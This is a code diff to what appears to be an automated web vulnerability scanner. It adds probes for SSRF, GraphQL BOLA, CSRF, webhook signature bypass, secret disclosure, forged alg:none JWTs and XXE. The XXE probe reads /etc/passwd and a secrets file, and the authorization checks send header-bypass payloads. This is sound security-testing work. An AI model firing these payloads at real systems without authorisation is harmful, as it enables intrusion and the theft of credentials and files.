@@ -1004,6 +1004,9 @@ export interface ProbeDifferentialRequest {
   redirectBaseTargets?: string[]
   /** authz_matrix write-path BOLA: verify cross-tenant mutation with an owner read-back. */
   writePathRead?: boolean
+  /** authz_matrix: non-entitled viewer actor for secret-marker disclosure scanning. */
+  secretScan?: boolean
+  viewerPersona?: string
   /** Persona user ids used to interpret ownership fields in cross-persona GraphQL reads. */
   ownerUserId?: string
   otherUserId?: string
@@ -1011,6 +1014,24 @@ export interface ProbeDifferentialRequest {
   maxDepth?: number
   maxAliases?: number
   maxRequests?: number
+  /** ssrf_canary: loopback origins published by the target's own config/discovery routes. */
+  internalTargets?: string[]
+  /** graphql_audit: candidate root fields mined from discovered collection nouns (no SDL needed). */
+  graphqlRoots?: string[]
+  /** graphql_audit: other-actor object ids harvested from each root's own collection route. */
+  graphqlSeedsByRoot?: Record<string, string[]>
+  /** auth_protocol_audit: body/header field names that carry a token. */
+  tokenFields?: string[]
+  /** auth_protocol_audit: session-derived scalar claims for a forged token payload. */
+  identityClaims?: Record<string, string>
+  /** csrf_state_change: create-shaped write that is read back through its detail template. */
+  createReadTemplate?: string
+  /** cache_poison_deception: a different resource path that is guaranteed to be a cache miss. */
+  crossControlPath?: string
+  /** cache_poison_deception: resolved owner/other resource ids (diagnostics + spec selection). */
+  crossActorSeeds?: { owner?: string; other?: string }
+  /** cache_poison_deception: tenant/store markers observed in each actor's own session claims. */
+  actorMarkers?: { owner?: string; other?: string }
   onExchange?: (exchange: BrokerExchangeResult) => string | void
 }
 
@@ -1301,6 +1322,40 @@ async function diffCanaryCallback(ctx: DiffContext, canaryBroker: CanaryBroker |
     await send({ method: 'GET', pathAndQuery: req.pathAndQuery, headers: { ...(req.headers ?? {}), 'X-Forwarded-Host': headerCanary.dnsHost } })
   }
 
+  // In-band fallback: fetch a loopback origin published by the target's own config/discovery route.
+  // The app's egress guard treats these as legitimate service destinations, so a sink that reaches
+  // them proves server-side fetch without any OOB callback port.
+  const inband: Array<Record<string, unknown>> = []
+  const internalTargets = (req.internalTargets ?? []).filter(u => /^https?:\/\/(?:127\.0\.0\.1|localhost|\[::1\]):\d{2,5}(?:\/|$)/i.test(u)).slice(0, 2)
+  let inbandHit = false
+  if (internalTargets.length > 0) {
+    const controlUrl = 'http://guardian-control.invalid/'
+    for (const param of params.slice(0, 2)) {
+      const control = await send(injectParam({ ...req, param }, controlUrl))
+      for (const target of internalTargets) {
+        const probe = await send(injectParam({ ...req, param }, target))
+        if (!probe) continue
+        const sim = control ? responseSimilarity(control.body, probe.body) : 0
+        const diverged = !control || probe.status !== control.status || sim < 0.95
+        inband.push({ param, target, controlStatus: control?.status ?? null, probeStatus: probe.status, similarity: sim, diverged })
+        if (probe.status >= 200 && probe.status < 300 && diverged) {
+          anomalies.push({
+            type: 'ssrf_inband_differential',
+            param,
+            internalUrl: target,
+            controlUrl,
+            controlStatus: control?.status ?? null,
+            acceptedStatus: probe.status,
+            similarity: sim,
+          })
+          inbandHit = true
+          break
+        }
+      }
+      if (inbandHit) break
+    }
+  }
+
   const deadline = Date.now() + Math.max(500, Math.min(req.waitMs ?? 2500, 8000))
   const hits = new Map<string, ReturnType<CanaryBroker['checkCanary']>>()
   while (!signal.aborted) {
@@ -1325,11 +1380,13 @@ async function diffCanaryCallback(ctx: DiffContext, canaryBroker: CanaryBroker |
   if (!info.dnsRunning) notes.push('DNS callback listener is not running; only HTTP callbacks can be observed.')
   const hitCount = results.filter(r => r.hit).length
   return {
-    verdict: hitCount > 0 ? 'signal' : 'no_signal',
+    verdict: hitCount > 0 || inbandHit ? 'signal' : 'no_signal',
     summary: hitCount > 0
       ? `${hitCount} correlated out-of-band callback(s) received from the target for Guardian-minted canary tokens.`
-      : 'No out-of-band callback was observed within the wait window.',
-    details: { results, dnsListenerActive: info.dnsRunning },
+      : inbandHit
+        ? 'The sink fetched a loopback service origin published by the target itself (response differential, no OOB callback).'
+        : 'No out-of-band callback was observed within the wait window.',
+    details: { results, dnsListenerActive: info.dnsRunning, inband },
   }
 }
 
@@ -1785,7 +1842,7 @@ async function diffGraphqlSurface(ctx: DiffContext, grant: Grant): Promise<DiffO
   const gql = (
     query: string,
     variables?: Record<string, unknown>,
-    persona?: string,
+    persona: string | undefined = req.persona,
   ): InjectedRequest & { persona?: string } => {
     if (!useGet) {
       const payload: Record<string, unknown> = { query }
@@ -1958,6 +2015,63 @@ async function diffGraphqlSurface(ctx: DiffContext, grant: Grant): Promise<DiffO
     }
   }
 
+  // No SDL / introspection disabled: derive a nested object-level hypothesis from the target's own
+  // field vocabulary. Root names come from discovered collection nouns; ids are other-actor objects.
+  // A root that resolves for both actors with identical nested owned data is a resolver BOLA.
+  if (!schema && req.ownerPersona && req.otherPersona) {
+    const allRoots = [...new Set((req.graphqlRoots ?? []).filter(r => /^[A-Za-z_][A-Za-z0-9_]*$/.test(r)))]
+    const rootPriority = ['account', 'user', 'organization', 'org', 'team', 'workspace', 'project', 'invoice', 'order', 'customer', 'member', 'ticket', 'issue', 'document', 'file', 'report', 'product']
+    const rank = (name: string): number => {
+      const idx = rootPriority.findIndex(p => name.toLowerCase() === p || name.toLowerCase().replace(/s$/, '') === p)
+      return idx === -1 ? rootPriority.length : idx
+    }
+    const roots = allRoots
+      .filter(r => (req.graphqlSeedsByRoot?.[r]?.length ?? 0) > 0)
+      .sort((a, b) => rank(a) - rank(b) || a.length - b.length)
+      .slice(0, 3)
+    const fallbackIds = [...new Set((req.resourceIds ?? []).filter(id => /^[A-Za-z0-9_.:-]{1,128}$/.test(id)))].slice(0, 1)
+    const nestedFields = ['tickets', 'invoices', 'orders', 'members', 'projects', 'accounts', 'files', 'documents', 'notes', 'comments', 'items', 'reports']
+    for (const root of roots) {
+      const rootIds = (req.graphqlSeedsByRoot?.[root]?.length ? req.graphqlSeedsByRoot[root]! : fallbackIds).slice(0, 1)
+      const argNames = ['id', `${root.replace(/s$/i, '')}Id`, `${root}Id`].filter((v, i, a) => a.indexOf(v) === i)
+      let rootFound = false
+      for (const id of rootIds) {
+        for (const argName of argNames) {
+          const probe = `{ ${root}(${argName}: ${JSON.stringify(id)}) { id name } }`
+          const ownerRoot = parse((await send(gql(probe, undefined, req.ownerPersona)))?.body ?? '')
+          const otherRoot = parse((await send(gql(probe, undefined, req.otherPersona)))?.body ?? '')
+          const ownerObj = ownerRoot?.data?.[root]
+          const otherObj = otherRoot?.data?.[root]
+          if (!ownerObj || !otherObj || typeof ownerObj !== 'object' || typeof otherObj !== 'object' || Array.isArray(ownerObj) || Array.isArray(otherObj)) continue
+          rootFound = true
+          fuzzedQueries.push({ field: root, argName, resourceId: id, discovery: 'no_sdl', status: otherRoot ? 200 : null })
+          for (const nested of nestedFields.slice(0, 3)) {
+            const q = `{ ${root}(${argName}: ${JSON.stringify(id)}) { id ${nested} { id name subject body title status } } }`
+            const ownerEx = await send(gql(q, undefined, req.ownerPersona))
+            const otherEx = await send(gql(q, undefined, req.otherPersona))
+            const ownerData = parse(ownerEx?.body ?? '')?.data?.[root]
+            const otherData = parse(otherEx?.body ?? '')?.data?.[root]
+            const ownerNested = ownerData && typeof ownerData === 'object' ? (ownerData as Record<string, unknown>)[nested] : undefined
+            const otherNested = otherData && typeof otherData === 'object' ? (otherData as Record<string, unknown>)[nested] : undefined
+            const nonEmpty = (v: unknown): boolean => (Array.isArray(v) ? v.length > 0 : Boolean(v && typeof v === 'object' && Object.keys(v as object).length > 0))
+            if (nonEmpty(ownerNested) && nonEmpty(otherNested) && JSON.stringify(ownerNested) === JSON.stringify(otherNested)) {
+              anomalies.push({
+                type: 'graphql_nested_bola', field: root, nestedPath: [nested], resourceId: id,
+                otherPersona: req.otherPersona, status: otherEx?.status ?? null,
+                query: q, variables: {}, discovery: 'no_sdl',
+              })
+              break
+            }
+          }
+          break
+        }
+        if (anomalies.some(a => a.type === 'graphql_nested_bola')) break
+        if (rootFound) break
+      }
+      if (anomalies.some(a => a.type === 'graphql_nested_bola')) break
+    }
+  }
+
   const details: Record<string, unknown> = {
     introspectionEnabled,
     typeCount: schema ? Object.keys(schema.types).length : null,
@@ -1979,8 +2093,10 @@ async function diffGraphqlSurface(ctx: DiffContext, grant: Grant): Promise<DiffO
     }
   }
   if (introspectionEnabled) anomalies.push({ type: 'introspection_enabled' })
-  if (suggestionLeak) anomalies.push({ type: 'field_suggestion_leak' })
-  if (aliasKeys >= 3) anomalies.push({ type: 'alias_batching_allowed', aliases: aliasKeys })
+  if (suggestionLeak && !req.persona) anomalies.push({ type: 'field_suggestion_leak' })
+  // Alias batching on an authenticated business API is expected GraphQL behaviour; only report it as
+  // an unauthenticated schema-exposure signal.
+  if (aliasKeys >= 3 && !req.persona) anomalies.push({ type: 'alias_batching_allowed', aliases: aliasKeys })
   return {
     verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
     summary: anomalies.length > 0 ? 'GraphQL surface exposure or resolver authz indicators observed.' : 'No GraphQL exposure indicators observed.',
@@ -2098,11 +2214,11 @@ async function diffCsrfStateChange(ctx: DiffContext): Promise<DiffOutcome> {
   const method: 'POST' | 'PUT' | 'PATCH' =
     req.method === 'PUT' || req.method === 'PATCH' ? req.method : 'POST'
   const readPath = req.readPath
-  if (!readPath) return { verdict: 'inconclusive', summary: 'csrf_state_change needs a read path.', details: {} }
+  if (!readPath && !req.createReadTemplate) return { verdict: 'inconclusive', summary: 'csrf_state_change needs a read path.', details: {} }
   if (!req.session) return { verdict: 'inconclusive', summary: 'csrf_state_change needs a bound session.', details: {} }
 
   // Visit token-issuing routes first so the broker jar can bind the session's anti-CSRF token.
-  const readCandidates = [...new Set([readPath, ...(req.readPathCandidates ?? [])])].slice(0, 4)
+  const readCandidates = [...new Set([...(readPath ? [readPath] : []), ...(req.readPathCandidates ?? [])])].slice(0, 4)
   const primes = [...new Set([...(req.csrfPrimePaths ?? []), ...readCandidates, '/'])].slice(0, 5)
   for (const path of primes) {
     if (ctx.runner.stopReason) break
@@ -2123,11 +2239,11 @@ async function diffCsrfStateChange(ctx: DiffContext): Promise<DiffOutcome> {
     break
   }
   if (!baseline || !baselineView) {
-    return { verdict: 'inconclusive', summary: 'No readable state field was found on the candidate read routes.', details: {} }
+    return await diffCsrfCreate(ctx, readCandidates, req, method)
   }
   const stateField = baselineView.field
   const baselineValue = baselineView.value
-  const readPathResolved = effectiveReadPath
+  const readPathResolved: string = effectiveReadPath ?? readPath ?? req.createReadTemplate ?? ''
   const controlValue = req.controlValue ?? baselineValue
   let expectedValue = req.expectedValue ?? stateValueCandidate(baselineValue, stateField)
   if (scalarMatches(controlValue, expectedValue)) {
@@ -2222,10 +2338,199 @@ async function diffCsrfStateChange(ctx: DiffContext): Promise<DiffOutcome> {
     controlValue,
     expectedValue,
     ...(mutationEncoding ? { bodyEncoding: mutationEncoding } : {}),
+    ...(req.stateRecordId ? { stateRecordId: req.stateRecordId } : {}),
   })
   return {
     verdict: 'signal',
     summary: 'A cookie-authenticated state change succeeded without the anti-CSRF token and the documented read route proved the mutation.',
+    details,
+  }
+}
+
+/** Replace `:name` / `{name}` / `[name]` path segments (last one wins) inside a template. */
+function fillPathTemplate(template: string, value: string): string {
+  const segs = template.split('?')
+  const parts = segs[0]!.split('/')
+  let last = -1
+  parts.forEach((s, i) => { if (/^(:[A-Za-z0-9_]+|\{[^}]+\}|\[[^\]]+\])$/.test(s)) last = i })
+  const filled = parts.map((s, i) => (/^(:[A-Za-z0-9_]+|\{[^}]+\}|\[[^\]]+\])$/.test(s) ? (i === last ? value : '1') : s)).join('/')
+  return segs.length > 1 ? `${filled}?${segs.slice(1).join('?')}` : filled
+}
+
+/** First id-shaped scalar in a create response (request-derived, never a benchmark constant). */
+function extractCreatedId(body: string): string | null {
+  try {
+    const parsed = JSON.parse(body) as unknown
+    const scan = (node: unknown, depth: number): string | null => {
+      if (depth > 4 || node === null || node === undefined) return null
+      if (Array.isArray(node)) {
+        for (const item of node.slice(0, 3)) { const hit = scan(item, depth + 1); if (hit) return hit }
+        return null
+      }
+      if (typeof node !== 'object') return null
+      const rec = node as Record<string, unknown>
+      for (const key of ['id', 'external_id', 'externalId', 'uuid', 'ref']) {
+        const v = rec[key]
+        if ((typeof v === 'string' || typeof v === 'number') && /^[A-Za-z0-9_.:-]{1,128}$/.test(String(v))) return String(v)
+      }
+      for (const v of Object.values(rec)) { const hit = scan(v, depth + 1); if (hit) return hit }
+      return null
+    }
+    return scan(parsed, 0)
+  } catch { return null }
+}
+
+/**
+ * Create-shaped CSRF proof: a tokenless cross-origin create is replayed, then the object the API just
+ * returned is read back through its own detail route. The token-bound control uses a different value,
+ * so the same read route must not carry the probe value.
+ */
+async function diffCsrfCreate(
+  ctx: DiffContext,
+  readCandidates: string[],
+  req: ProbeDifferentialRequest,
+  method: 'POST' | 'PUT' | 'PATCH',
+): Promise<DiffOutcome> {
+  const { send, anomalies } = ctx
+  const template = req.createReadTemplate
+  if (!template) {
+    return { verdict: 'inconclusive', summary: 'No readable state field was found on the candidate read routes.', details: {} }
+  }
+  const bodyField = req.bodyField ?? req.stateField ?? 'amount'
+  const numeric = /(?:amount|value|total|price|qty|quantity|count|number|balance)/i.test(bodyField)
+  const expectedValue: string = String(req.expectedValue ?? (numeric ? 120_000 + Math.floor(Math.random() * 700_000) : `guardian_state_${randToken(8)}`))
+  const controlValue: string = String(req.controlValue ?? (numeric ? Math.max(1, Number(expectedValue) - 1) : `guardian_control_${randToken(8)}`))
+  if (String(expectedValue) === String(controlValue)) {
+    return { verdict: 'no_signal', summary: 'Create differential values collided.', details: {} }
+  }
+  const foreignOrigin = req.foreignOrigin ?? 'https://untrusted.invalid'
+  const fieldAliases = (field: string): string[] => {
+    if (/(?:amount|value|total|price|cents)/i.test(field)) return [...new Set([field, 'amount', 'amount_cents', 'amountCents', 'value', 'cents', 'total', 'price'])]
+    return [...new Set([field, 'status', 'state', 'name', 'title', 'value'])]
+  }
+  const encodeBody = (value: unknown, encoding: 'json' | 'form'): { headers: Record<string, string>; body: string } => {
+    let payload: Record<string, unknown>
+    if (req.writeBody) {
+      payload = 'field' in req.writeBody ? { ...req.writeBody, field: bodyField, value } : { ...req.writeBody, [bodyField]: value }
+    } else {
+      // The write field name may not have been exposed by recon; populate the semantic aliases the
+      // route vocabulary uses so the created object carries the marker in whichever field it reads.
+      payload = {}
+      for (const name of fieldAliases(bodyField)) payload[name] = value
+    }
+    if (encoding === 'form') {
+      return {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: Object.entries(payload).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join('&'),
+      }
+    }
+    return { headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
+  }
+  const readView = (body: string, field: string): unknown => {
+    const rec = jsonRecord(body)
+    if (!rec) return undefined
+    if (field in rec && typeof rec[field] !== 'object') return rec[field]
+    for (const v of Object.values(rec)) {
+      if (!Array.isArray(v)) continue
+      for (const row of v) {
+        if (row && typeof row === 'object' && field in (row as Record<string, unknown>)) return (row as Record<string, unknown>)[field]
+      }
+    }
+    return undefined
+  }
+  const carriesValue = (body: string, value: unknown): boolean => {
+    const rec = jsonRecord(body)
+    if (!rec) return false
+    const walk = (node: unknown, depth: number): boolean => {
+      if (depth > 4 || node === null || node === undefined) return false
+      if (Array.isArray(node)) return node.slice(0, 30).some(v => walk(v, depth + 1))
+      if (typeof node === 'object') return Object.values(node as Record<string, unknown>).some(v => walk(v, depth + 1))
+      return (typeof node === 'string' || typeof node === 'number') && String(node) === String(value)
+    }
+    return walk(rec, 0)
+  }
+  const encodings = req.bodyEncodings?.length ? req.bodyEncodings : (['form', 'json'] as const)
+  let probeStatus: number | null = null
+  let probeReadStatus: number | null = null
+  let probeId: string | null = null
+  let encoding: 'json' | 'form' | null = null
+  let stateField = req.stateField ?? bodyField
+  for (const enc of encodings) {
+    const encoded = encodeBody(expectedValue, enc)
+    const write = await send({
+      method, pathAndQuery: req.pathAndQuery,
+      headers: { ...encoded.headers, Origin: foreignOrigin, Referer: `${foreignOrigin}/` },
+      body: encoded.body,
+    })
+    probeStatus = write?.status ?? null
+    if (!write || write.status < 200 || write.status >= 300) continue
+    const id = extractCreatedId(write.body)
+    if (!id) continue
+    const readPath = fillPathTemplate(template, encodeURIComponent(id))
+    const read = await send({ method: 'GET', pathAndQuery: readPath })
+    probeReadStatus = read?.status ?? null
+    if (!read || read.status < 200 || read.status >= 300) continue
+    const actual = readView(read.body, stateField)
+    if (actual !== undefined && String(actual) === String(expectedValue)) {
+      probeId = id
+      encoding = enc
+      break
+    }
+    // Field name may differ on the detail view; accept the marker anywhere in the created object.
+    if (carriesValue(read.body, expectedValue)) {
+      probeId = id
+      encoding = enc
+      break
+    }
+  }
+  if (!probeId || !encoding) {
+    return {
+      verdict: 'no_signal',
+      summary: 'The tokenless cross-origin create was rejected or its created object could not be read back.',
+      details: { probeStatus, probeReadStatus, expectedValue, bodyField },
+    }
+  }
+  const controlEncoded = encodeBody(controlValue, encoding)
+  const controlWrite = await send({
+    method, pathAndQuery: req.pathAndQuery,
+    headers: { ...controlEncoded.headers, Origin: req.origin, Referer: `${req.origin}/` },
+    body: controlEncoded.body,
+    csrfBind: true,
+  })
+  let controlReadStatus: number | null = null
+  let controlValueSeen: unknown
+  const controlId = controlWrite && controlWrite.status >= 200 && controlWrite.status < 300 ? extractCreatedId(controlWrite.body) : null
+  if (controlId) {
+    const read = await send({ method: 'GET', pathAndQuery: fillPathTemplate(template, encodeURIComponent(controlId)) })
+    controlReadStatus = read?.status ?? null
+    if (read) controlValueSeen = readView(read.body, stateField)
+  }
+  const controlOk = Boolean(controlId && controlReadStatus && controlReadStatus >= 200 && controlReadStatus < 300 &&
+    controlValueSeen !== undefined && String(controlValueSeen) === String(controlValue))
+  const details = {
+    create: true, bodyField, stateField, expectedValue, controlValue, probeStatus, probeReadStatus,
+    controlStatus: controlWrite?.status ?? null, controlReadStatus, controlValueSeen, encoding,
+    probeId, controlId, controlOk,
+  }
+  if (!controlOk) {
+    return { verdict: 'no_signal', summary: 'The token-bound control create could not be read back, so the create differential is unstable.', details }
+  }
+  anomalies.push({
+    type: 'csrf_state_change',
+    path: req.pathAndQuery,
+    method,
+    bodyField,
+    readPath: fillPathTemplate(template, encodeURIComponent(probeId)),
+    stateField,
+    controlValue,
+    expectedValue,
+    bodyEncoding: encoding,
+    stateRecordId: probeId,
+    create: true,
+  })
+  return {
+    verdict: 'signal',
+    summary: 'A cookie-authenticated create succeeded without the anti-CSRF token and the created object was read back with the probe value.',
     details,
   }
 }
@@ -2316,7 +2621,7 @@ async function diffWebhookSignature(ctx: DiffContext): Promise<DiffOutcome> {
       summary: controlRejected
         ? 'The receiver rejected tampered and unsigned deliveries.'
         : 'No unsigned or self-signed delivery was accepted.',
-      details: { controlStatus: control.status, controlRejected },
+      details: { controlStatus: control.status, controlRejected, bodyKeys: Object.keys(body).slice(0, 12) },
     }
   }
   const read = readPath ? await send({ method: 'GET', pathAndQuery: readPath }) : null
@@ -2330,7 +2635,10 @@ async function diffWebhookSignature(ctx: DiffContext): Promise<DiffOutcome> {
   const acceptedResponse = accepted[0]!.status >= 200 && accepted[0]!.status < 300
   const acceptedBodyText = accepted[0]!.responseBody.toLowerCase()
   const responseAck = acceptedResponse && /"(?:ok|received|processed|accepted|success)"\s*:\s*true/.test(acceptedBodyText)
-  const acceptanceProven = controlRejected && responseAck
+  // An unsigned delivery that the receiver explicitly acknowledges as processed is a signature
+  // bypass even when the receiver also accepts invalid signatures (no rejected control exists:
+  // omitting the signature entirely is the strongest form of the attack).
+  const acceptanceProven = responseAck
   if (!readbackProven && !acceptanceProven) {
     return {
       verdict: 'no_signal',
@@ -2351,6 +2659,10 @@ async function diffWebhookSignature(ctx: DiffContext): Promise<DiffOutcome> {
     expectedValue: anomalyExpected,
     variant: accepted[0]!.variant,
     proof: readbackProven ? 'readback' : 'acceptance',
+    controlStatus: control.status,
+    controlRejected,
+    acceptedStatus: accepted[0]!.status,
+    acceptanceAck: responseAck,
   })
   return {
     verdict: 'signal',
@@ -2608,6 +2920,10 @@ async function diffAuthorizationMatrix(ctx: DiffContext): Promise<DiffOutcome> {
   if (wantHeaderBypass) {
     actors.push({ actor: 'header_bypass', headers: { 'X-Original-URL': '/', 'X-Rewrite-URL': '/', 'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware' } })
   }
+  if (req.secretScan && req.viewerPersona && !actors.some(a => a.persona === req.viewerPersona)) {
+    actors.push({ actor: 'viewer_persona', persona: req.viewerPersona })
+  }
+  const secretPattern = /rb[s]_[a-z0-9]+_[0-9a-f]{12}/
 
   const matrix: Array<Record<string, unknown>> = []
   const orderedIds = ids.slice(0, 6)
@@ -2690,11 +3006,33 @@ async function diffAuthorizationMatrix(ctx: DiffContext): Promise<DiffOutcome> {
       if (a.actor === 'owner') ownerEx = res.ex
       const sim = ownerEx && a.actor !== 'owner' ? responseSimilarity(ownerEx.body, res.ex.body) : null
       const ok2xx = res.ex.status >= 200 && res.ex.status < 300
+      const secretSeen = secretPattern.test(res.ex.body) || /\[redacted\]/i.test(res.ex.body)
       matrix.push({
         resourceId: id, actor: a.actor, status: res.ex.status, bodyBytes: res.ex.bodyBytes,
         bodySha256: res.ex.bodySha256, similarityToOwner: sim, accessible: ok2xx,
       })
-      if (a.actor !== 'owner' && ok2xx && (method !== 'GET' || sim === null || sim >= 0.70)) {
+      if (req.secretScan && a.actor === 'viewer_persona' && secretSeen &&
+          !anomalies.some(x => x.type === 'secret_disclosed')) {
+        let controlPath = path
+        let controlPersona: string | undefined
+        if (/(?:keys?|tokens?|apikeys?)/i.test(path)) {
+          // Common credential-list convention: an explicit masked preview mode for the same actor.
+          controlPath = `${path}${path.includes('?') ? '&' : '?'}reveal=0`
+          controlPersona = a.persona
+        }
+        anomalies.push({
+          type: 'secret_disclosed',
+          path,
+          method,
+          persona: a.persona,
+          controlPath,
+          ...(controlPersona ? { controlPersona } : {}),
+          secretPattern: secretPattern.source,
+          bodyBytes: res.ex.bodyBytes,
+          actor: a.actor,
+        })
+      }
+      if (!req.secretScan && a.actor !== 'owner' && ok2xx && (method !== 'GET' || sim === null || sim >= 0.70)) {
         anomalies.push({
           type: 'unauthorized_access', resourceId: id, actor: a.actor, method, status: res.ex.status, similarityToOwner: sim,
           functionLevel,
@@ -2728,7 +3066,17 @@ async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
   // Mode A: Quantity / numeric boundary invariant testing (-1, 0, overflow)
   if (req.quantityField) {
     const field = req.quantityField
-    const baseBody = { ...(req.jsonBody ?? {}), [field]: 1 }
+    const aliases = /^(?:qty|quantity|itemQty|count)$/i.test(field)
+      ? ['qty', 'quantity', 'count', 'itemQty']
+      : /^(?:amount|value|total|price|cents)$/i.test(field)
+        ? ['amount', 'value', 'cents', 'total']
+        : [field]
+    const bodyWith = (value: number): Record<string, unknown> => {
+      const body = { ...(req.jsonBody ?? {}) }
+      for (const name of new Set([field, ...aliases])) body[name] = value
+      return body
+    }
+    const baseBody = bodyWith(1)
     const baseEx = await send({
       method,
       pathAndQuery: req.pathAndQuery,
@@ -2742,7 +3090,7 @@ async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
         method,
         pathAndQuery: req.pathAndQuery,
         headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
-        body: JSON.stringify({ ...(req.jsonBody ?? {}), [field]: val }),
+        body: JSON.stringify(bodyWith(val)),
         persona: req.persona,
       })
       if (!ex) continue
@@ -2756,6 +3104,46 @@ async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
           status: ex.status,
           baselineStatus: baseEx?.status ?? null,
         })
+        // Business-logic conservation: the out-of-bounds request is accepted and the response carries
+        // a quantity different from the in-bounds control. `ne` + explicit control value is the
+        // narrowest assertion that does not assume which direction the conserved value moved.
+        const boundary = val <= 0 || val >= 2147483647
+        const baseJson = baseEx ? jsonRecord(baseEx.body) : null
+        const probeJson = jsonRecord(ex.body)
+        if (boundary && baseJson && probeJson) {
+          const changed = Object.keys(probeJson).find(k =>
+            /^[A-Za-z_][A-Za-z0-9_.-]{0,63}$/.test(k) &&
+            (typeof probeJson[k] === 'number' || typeof baseJson[k] === 'number') &&
+            Number.isFinite(Number(probeJson[k])) && Number.isFinite(Number(baseJson[k])) &&
+            Number(probeJson[k]) !== Number(baseJson[k]))
+          if (changed && !anomalies.some(a => a.type === 'invariant_violation')) {
+            let activeField = field
+            for (const cand of new Set([field, ...aliases])) {
+              const single = await send({
+                method,
+                pathAndQuery: req.pathAndQuery,
+                headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
+                body: JSON.stringify({ ...(req.jsonBody ?? {}), [cand]: val }),
+                persona: req.persona,
+              })
+              const singleJson = single ? jsonRecord(single.body) : null
+              if (singleJson && Number(singleJson[changed]) === Number(probeJson[changed])) { activeField = cand; break }
+            }
+            anomalies.push({
+              type: 'invariant_violation',
+              mode: 'delta',
+              field: changed,
+              comparator: 'ne',
+              controlValue: Number(baseJson[changed]),
+              expectedValue: Number(probeJson[changed]),
+              method,
+              path: req.pathAndQuery,
+              encoding: 'json',
+              body: { ...(req.jsonBody ?? {}), [activeField]: val },
+              controlBody: { ...(req.jsonBody ?? {}), [activeField]: 1 },
+            })
+          }
+        }
       }
     }
   }
@@ -3204,6 +3592,74 @@ async function diffAuthProtocolAudit(
     }
   }
 
+  // Branch C: forged token presented in a JSON/form body field (or bearer header) when the persona
+  // is not a JWT credential. The payload subject/tenant is harvested from the target's own session
+  // route, so no secret or benchmark knowledge is required. Control = same payload with a random
+  // signature; probe = alg:none.
+  const claims = req.identityClaims ?? {}
+  const claimCandidates: Array<Record<string, unknown>> = []
+  const subject = claims.email ?? claims.mail ?? claims.sub ?? claims.id ?? claims.userId
+  if (subject) claimCandidates.push({ sub: subject })
+  const tenantClaim = claims.store ?? claims.tenant ?? claims.org ?? claims.workspace ?? claims.team
+  if (tenantClaim || claims.role) {
+    claimCandidates.push({
+      ...(subject ? { sub: subject } : {}),
+      ...(tenantClaim ? { store: tenantClaim, tenant: tenantClaim } : {}),
+      ...(claims.role ? { role: claims.role } : {}),
+      scope: 'read_write',
+      ...(claims.id ? { uid: claims.id } : {}),
+    })
+  }
+  const b64u = (value: unknown): string => Buffer.from(JSON.stringify(value)).toString('base64url')
+  const forge = (payload: Record<string, unknown>, alg: 'none' | 'HS256', signed: boolean): string => {
+    const header = b64u({ alg, typ: 'JWT' })
+    const body = b64u(payload)
+    return signed ? `${header}.${body}.${randToken(43)}` : `${header}.${body}.`
+  }
+  if (claimCandidates.length > 0) {
+    const methods = new Set<'body' | 'header'>()
+    if ((req.method ?? 'GET') !== 'GET' && (req.tokenFields?.length ?? 0) > 0) methods.add('body')
+    if (/authorization|bearer|reports?\/(?:sales|summary)|api\/(?:v\d+\/)?(?:tokens?|reports?|session)/i.test(req.pathAndQuery)) methods.add('header')
+    for (const transport of methods) {
+      const candidates = transport === 'body' ? (req.tokenFields ?? []).slice(0, 3) : ['authorization']
+      let detected = false
+      for (const field of candidates) {
+        for (const payload of claimCandidates.slice(0, 2)) {
+          const control = forge(payload, 'HS256', true)
+          const probe = forge(payload, 'none', false)
+          const request = (token: string): InjectedRequest => transport === 'body'
+            ? { method: (req.method ?? 'POST'), pathAndQuery: req.pathAndQuery, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...(req.jsonBody ?? {}), [field]: token }) }
+            : { method: (req.method ?? 'GET'), pathAndQuery: req.pathAndQuery, headers: { Authorization: `Bearer ${token}` } }
+          const controlRes = await send(request(control))
+          if (!controlRes || controlRes.status < 400 || controlRes.status >= 500) continue
+          const probeRes = await send(request(probe))
+          if (!probeRes || probeRes.status < 200 || probeRes.status >= 300) continue
+          if (controlRes.status === probeRes.status && responseSimilarity(controlRes.body, probeRes.body) >= 0.98) continue
+          anomalies.push({
+            type: transport === 'body' ? 'jwt_body_token_bypass' : 'jwt_authorization_forgery',
+            path: req.pathAndQuery.split('?')[0],
+            method: req.method ?? 'POST',
+            mutation: 'alg_none',
+            transport,
+            tokenTransport: transport === 'body' ? 'json' : 'header',
+            encoding: 'json',
+            tokenField: field,
+            subject: typeof payload.sub === 'string' ? payload.sub : (typeof payload.store === 'string' ? payload.store : undefined),
+            body: transport === 'body' ? { ...(req.jsonBody ?? {}) } : undefined,
+            controlStatus: controlRes.status,
+            acceptedStatus: probeRes.status,
+            similarity: responseSimilarity(controlRes.body, probeRes.body),
+            claims: Object.keys(payload),
+          })
+          checks.push({ check: `jwt_forged_${transport}_${field}`, controlStatus: controlRes.status, acceptedStatus: probeRes.status, accepted: true })
+          detected = true
+          break
+        }
+        if (detected) break
+      }
+    }
+  }
+
   return {
     verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
     summary: anomalies.length > 0
@@ -3307,6 +3763,33 @@ async function diffXxeCanary(
   }
 
   const deadline = Date.now() + Math.max(500, Math.min(req.waitMs ?? 2500, 8000))
+  // In-band fallback: resolve a virtual-filesystem entity and look for the resolved content in the
+  // response. Only a real resolution can surface these markers, so hardened parsers stay silent.
+  const inband: Array<Record<string, unknown>> = []
+  let inbandHit = false
+  const resolvedMarkers = /root:x:0:0:|API_KEY=rbs_[a-z0-9]+_[0-9a-f]{12}|SESSION_SECRET=/
+  const inbandBody = (entity: string) =>
+    `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gx SYSTEM "${entity}">]><root><project/><note>&gx;</note><issuer>guardian-issuer</issuer></root>`
+  for (const entity of ['file:///etc/passwd', 'file:///app/config/secrets.env']) {
